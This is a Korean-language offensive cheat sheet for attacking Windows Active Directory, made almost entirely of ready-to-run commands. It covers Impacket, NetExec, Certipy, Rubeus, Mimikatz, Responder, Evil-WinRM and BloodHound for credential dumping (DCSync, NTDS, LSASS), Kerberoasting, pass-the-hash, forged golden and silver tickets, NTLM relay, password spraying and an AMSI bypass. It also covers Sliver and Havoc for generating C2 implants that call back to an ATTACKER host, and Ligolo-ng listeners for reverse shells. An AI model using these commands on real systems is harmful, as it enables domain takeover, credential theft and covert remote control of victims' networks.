# 도구 레퍼런스

---

## Impacket

| 스크립트 | 용도 | 명령어 |
|---------|------|--------|
| secretsdump | DCSync, SAM/NTDS 덤프 | `secretsdump.py DOMAIN/user:pass@DC` |
| GetNPUsers | AS-REP Roasting | `GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass` |
| GetUserSPNs | Kerberoasting | `GetUserSPNs.py DOMAIN/user:pass -request` |
| psexec | 원격 실행 | `psexec.py DOMAIN/user:pass@TARGET` |
| wmiexec | WMI 원격 실행 | `wmiexec.py DOMAIN/user:pass@TARGET` |
| smbexec | SMB 원격 실행 | `smbexec.py DOMAIN/user:pass@TARGET` |
| atexec | Task 원격 실행 | `atexec.py DOMAIN/user:pass@TARGET "cmd"` |
| dcomexec | DCOM 원격 실행 | `dcomexec.py DOMAIN/user:pass@TARGET` |
| getTGT | TGT 요청 | `getTGT.py DOMAIN/user -hashes :HASH` |
| getST | Service Ticket | `getST.py -spn SPN -impersonate admin DOMAIN/user` |
| ticketer | Golden/Silver Ticket | `ticketer.py -nthash HASH -domain-sid SID -domain DOM admin` |
| ntlmrelayx | NTLM Relay | `ntlmrelayx.py -tf targets.txt -smb2support` |
| addcomputer | 컴퓨터 계정 추가 | `addcomputer.py DOMAIN/user:pass -computer-name FAKE$` |
| rbcd | RBCD 설정 | `rbcd.py -delegate-to T$ -delegate-from F$ -action write DOMAIN/user:pass` |
| dacledit | DACL 편집 | `dacledit.py -action write -rights DCSync DOMAIN/user:pass` |
| findDelegation | 위임 조회 | `findDelegation.py DOMAIN/user:pass` |
| lookupsid | SID 열거 | `lookupsid.py DOMAIN/user:pass@DC` |

### 인증 방식

```bash
# 비밀번호
impacket-psexec DOMAIN/USER:'PASS'@IP

# Hash
impacket-psexec USER@IP -hashes :NTHASH

# Kerberos
export KRB5CCNAME=ticket.ccache
impacket-psexec DOMAIN/USER@FQDN -k -no-pass
```

---

## NetExec (nxc)

```bash
# SMB
nxc smb IP -u USER -p PASS --shares
nxc smb IP -u USER -p PASS --users
nxc smb IP -u USER -p PASS --rid-brute
nxc smb IP -u USER -p PASS --sam
nxc smb IP -u USER -p PASS --lsa
nxc smb DC -u admin -p PASS --ntds
nxc smb IP -u USER -p PASS -x "whoami"
nxc smb SUBNET/24 --gen-relay-list targets.txt

# Password Spray
nxc smb IP -u users.txt -p 'Pass1!' --continue-on-success

# LDAP
nxc ldap DC -u USER -p PASS --users
nxc ldap DC -u USER -p PASS --kerberoasting output.txt
nxc ldap DC -u USER -p PASS --asreproast output.txt
nxc ldap DC -u USER -p PASS -M laps
nxc ldap DC -u USER -p PASS -M gmsa
nxc ldap DC -u USER -p PASS -M maq

# WinRM
nxc winrm IP -u USER -p PASS -x "whoami"

# MSSQL
nxc mssql IP -u USER -p PASS -x "whoami"

# Hash 인증
nxc smb IP -u USER -H NTHASH
```

---

## Certipy

```bash
certipy find -vulnerable -u USER@DOMAIN -p PASS -dc-ip DC -stdout
certipy req -u USER@DOMAIN -p PASS -ca CA -template TMPL -upn admin@DOMAIN -target DC
certipy auth -pfx admin.pfx -domain DOMAIN
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET$
certipy template -u USER@DOMAIN -p PASS -template TMPL -save-old -target DC
```

---

## bloodyAD

```bash
bloodyAD -d DOM -u USER -p PASS --host DC set password TARGET 'NewPass!'
bloodyAD -d DOM -u USER -p PASS --host DC add groupMember "GROUP" USER
bloodyAD -d DOM -u USER -p PASS --host DC add genericAll TARGET USER
bloodyAD -d DOM -u USER -p PASS --host DC add shadowCredentials TARGET
bloodyAD -d DOM -u USER -p PASS --host DC add rbcd TARGET FAKE$
bloodyAD -d DOM -u USER -p PASS --host DC set owner TARGET USER
bloodyAD -d DOM -u USER -p PASS --host DC get object TARGET
bloodyAD -d DOM -u USER -p PASS --host DC get writable --otype USER --right WRITE
```

---

## Rubeus (Windows)

```powershell
.\Rubeus.exe asreproast /outfile:hashes.txt
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe asktgt /user:USER /rc4:HASH /ptt
.\Rubeus.exe asktgt /user:USER /aes256:KEY /opsec /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe s4u /user:SVC$ /rc4:HASH /impersonateuser:admin /msdsspn:cifs/TARGET /ptt
.\Rubeus.exe triage
.\Rubeus.exe dump
.\Rubeus.exe monitor /interval:5 /nowrap
```

---

## Mimikatz (Windows)

```powershell
# 기본 실행
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# DCSync
lsadump::dcsync /user:DOMAIN\krbtgt
lsadump::dcsync /user:DOMAIN\Administrator

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# Golden Ticket
kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket
kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-... /target:server /service:cifs /rc4:HASH /ptt

# 티켓 추출
sekurlsa::tickets /export

# LSASS 미니덤프 분석
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# DPAPI
dpapi::masterkey /in:masterkey /sid:SID /password:PASS
dpapi::cred /in:credential /masterkey:KEY
```

---

## PowerView (Windows)

```powershell
Import-Module .\PowerView.ps1

# 도메인 정보
Get-Domain
Get-DomainController

# 사용자
Get-DomainUser | select samaccountname, description, memberof
Get-DomainUser -SPN                           # Kerberoastable
Get-DomainUser -PreauthNotRequired            # AS-REP Roastable

# 그룹
Get-DomainGroup -Identity "Domain Admins" | select member
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 컴퓨터
Get-DomainComputer | select dnshostname, operatingsystem
Get-DomainComputer -Unconstrained

# ACL
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# 세션/로컬 관리자
Find-LocalAdminAccess
Get-NetSession -ComputerName DC01

# GPO / Trust
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainTrust
Get-ForestTrust
```

---

## Hashcat

```bash
# 주요 해시 모드
# 1000  - NTLM
# 5600  - NetNTLMv2
# 13100 - Kerberoast (TGS-REP etype 23)
# 18200 - AS-REP Roast
# 16500 - JWT
# 3200  - bcrypt
# 1800  - sha512crypt (Linux)

hashcat -m 1000 hash.txt rockyou.txt
hashcat -m 13100 hash.txt rockyou.txt
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?l?d?d?d!'     # mask
hashcat -m 1000 hash.txt --show                          # 결과 확인
```

---

## Responder

```bash
sudo responder -I eth0                        # 기본 (모든 포이즈닝)
sudo responder -I eth0 -A                     # 분석 모드
sudo responder -I eth0 -wrf                   # WPAD + fingerprint

# ntlmrelayx와 함께 사용 시
# Responder.conf에서 SMB = Off, HTTP = Off 설정 후
sudo responder -I eth0

# 캡처된 해시
/usr/share/responder/logs/
```

---

## Evil-WinRM

```bash
evil-winrm -i IP -u USER -p PASS
evil-winrm -i IP -u USER -H NTHASH
evil-winrm -i IP -r DOMAIN                    # Kerberos

# 파일 전송
upload /local/file /remote/path
download /remote/file /local/path

# PowerShell 스크립트 로드
evil-winrm -i IP -u USER -p PASS -s /scripts/dir
menu
# DLL 로드 (Bypass-4MSI, dll-loader)
Bypass-4MSI
```

---

## BloodHound

```bash
# 데이터 수집
bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c all

# SharpHound (Windows)
.\SharpHound.exe -c All --excludedcs
.\SharpHound.exe -c All,GPOLocalGroup --stealth
```

### Cypher 쿼리

```cypher
// DA까지 최단 경로
MATCH p=shortestPath((u:User)-[*1..]->(g:Group))
WHERE g.name =~ "DOMAIN ADMINS@.*"
RETURN p

// Kerberoastable → DA
MATCH (u:User {hasspn:true}), (g:Group), p=shortestPath((u)-[*1..]->(g))
WHERE g.name =~ "DOMAIN ADMINS@.*"
RETURN p

// 패스워드 미만료 사용자
MATCH (u:User {pwdneverexpires:true}) RETURN u.name

// 세션 보유 호스트
MATCH (c:Computer)-[:HasSession]->(u:User)
WHERE u.name =~ "ADMIN@.*"
RETURN c.name, u.name

// AdminTo 관계 (로컬 관리자)
MATCH (u:User)-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

// Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## Ligolo-ng 참고

```bash
# 리스너 추가 (피봇 호스트에서 리버스 쉘 받기)
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# 다중 피벗 (Agent 체이닝)
>> session                                     # 첫 번째 세션
>> start --tun ligolo
# 두 번째 에이전트를 첫 번째 피봇을 통해 연결
>> listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601 --tcp
# 두 번째 에이전트 → 피봇1:11601 → 공격자
sudo ip route add 172.16.0.0/24 dev ligolo
```

---

## C2 프레임워크

### Sliver

```bash
./sliver-server
sliver > generate --mtls ATTACKER --os windows --save /tmp/implant.exe
sliver > generate beacon --mtls ATTACKER --os windows --save /tmp/beacon.exe
sliver > mtls -l 443

sliver (SESSION) > getuid
sliver (SESSION) > upload /local /remote
sliver (SESSION) > download /remote /local
sliver (SESSION) > shell
sliver (SESSION) > execute -o whoami
sliver (SESSION) > socks5 start
```

### Havoc

```bash
./havoc server --profile profiles/havoc.yaotl
./havoc client
# GUI에서 Payloads > Generate
```

| 항목 | Sliver | Havoc | Cobalt Strike |
|------|--------|-------|---------------|
| 가격 | 무료 | 무료 | 상용 |
| 프로토콜 | mTLS, HTTP/S, DNS | HTTP/S | HTTP/S, DNS, SMB |
| Evasion | 양호 | 우수 | 우수 |
| BOF | O | O | O |
